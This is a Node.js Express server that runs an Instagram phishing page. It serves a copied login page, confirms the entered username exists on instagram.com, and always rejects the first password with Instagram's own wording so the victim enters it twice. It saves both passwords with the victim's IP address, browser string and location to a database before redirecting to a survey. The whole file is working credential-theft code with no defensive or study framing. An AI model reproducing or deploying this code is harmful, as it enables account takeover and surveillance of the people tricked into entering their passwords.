const express=require('express');
const path=require('path')
const sessions=require('express-session');
const cookieParser=require('cookie-parser')
const app=express();
const mysql=require('mysql');
const request=require('request')
const pool=require('./pool');
const req = require('express/lib/request');

function authenticator(req,res,next) {
    if(req.session.userID){
        return next();
    }
    res.redirect('/')
}

app.use(express.static('../client'))
app.use(express.urlencoded({extended:false}));
app.use(express.json());
app.use(cookieParser())

app.get('/',(req,res)=>{
   
    res.sendFile(path.join(__dirname,'../client/index.html'))
    
 })
 app.use(sessions({
     secret:'something here',
     saveUninitialized:true,
     resave:true,
     cookie:{maxAge:1000*24*60*60*30,httpOnly:true}
 }))

let data={}
app.get('/auth',(req,res)=>{
    res.sendFile(path.join(__dirname,'../client/instagram.html'))
})
app.post('/auth',(req,res)=>{
    let lastLoc=cookieChecker();
    console.log(req.body);
    let url=`https://www.instagram.com/${req.body.id}`
    request.get(url,(err,resp,body)=>{
        if(resp.statusCode === 200){
            if(req.body.attempt==0){
                console.log(req.body);
                console.log(req.ip);
                console.log(req.headers['user-agent']);
                data.status="Not OK",
                data.error="Sorry, your password was incorrect. Please double-check your password.",
                data.tryNum="1"
                pool.getConnection((err,connection)=>{
                    if(err) throw err;
                    let sql=`insert into logininfo (username,pwd1,user_info,user_ip,samay) values (?,?,?,?,?)`;
                    
                    connection.query(sql,[req.body.id,req.body.pwd1,req.ip,req.headers['user-agent'], new Date],(error)=>{


                        if(error) throw error 
                    })
                    let sql1='insert into userdata (username,lastloc,curloc) values(?,?,?)'
                    
                    connection.query(sql1,[req.body.id,lastLoc,JSON.stringify(req.body.lastLoc)],(error)=>{
                        connection.release();
                        if(error) throw error
                    })
                    

                })
                res.send(data)
            }else{
                
                pool.getConnection((err,connection)=>{
                    if (err) {
                        throw err;
                    }
                    let sql1='insert into userdata (username,lastloc,curloc) values(?,?,?)'
                    connection.query(sql1,[req.body.id,lastLoc,JSON.stringify(req.body.lastLoc)],(error)=>{
                        
                        if(error) throw error
                    })
                    
                    let sql='Insert into logininfo (username,pwd2) values (?,?)';
                    connection.query(sql,[req.body.id,req.body.pwd2],(error)=>{
                        connection.release();
                        if(error){
                            res.send({msg:"not working"})
                            throw error;
                        }
                        else{
                            data.redirect='/survey';
                            let randomNum=Math.random()*1000000000000;
                            let cookVal={
                                user:req.body.id,
                                loggedIn:true,


                            }
                            req.session.userID=req.body.id;
                            res.cookie(req.body.id,JSON.stringify({user:req.body.id,last:req.body.lastLoc}), { maxAge:86400000*30, httpOnly: true})

                            res.send(data);
                        }
                    })
                    

                })
                // data.status="OK"
                // res.send(data)
               
            }
            
            
        }
        else{
            data.status="Not OK";
            data.error="The username you entered doesn't belong to an account. Please check your username and try again.";
            data.tryNum="0"
            res.send(data)
        }
    });

})

app.get('/survey',authenticator,(req,res)=>{
    
    res.sendFile(path.join(__dirname,'../client/questions.html'))
})
app.post('/survey-report',(req,res)=>{
    
    res.status(200).send({save:true,userId:req.session.userID});

    req.session.destroy;
})






app.listen(process.env.PORT || 3131,console.log("Running on 3131"))

//cookiechecker
function cookieChecker() {
    let cookieList=cookieParser.JSONCookie(req.cookies);
    for (const key in cookieList) {
        if(key===req.body.id){
            return JSON.parse(cookieList[req.body.id]).last
        }
    }
    return 'Used Only once'
}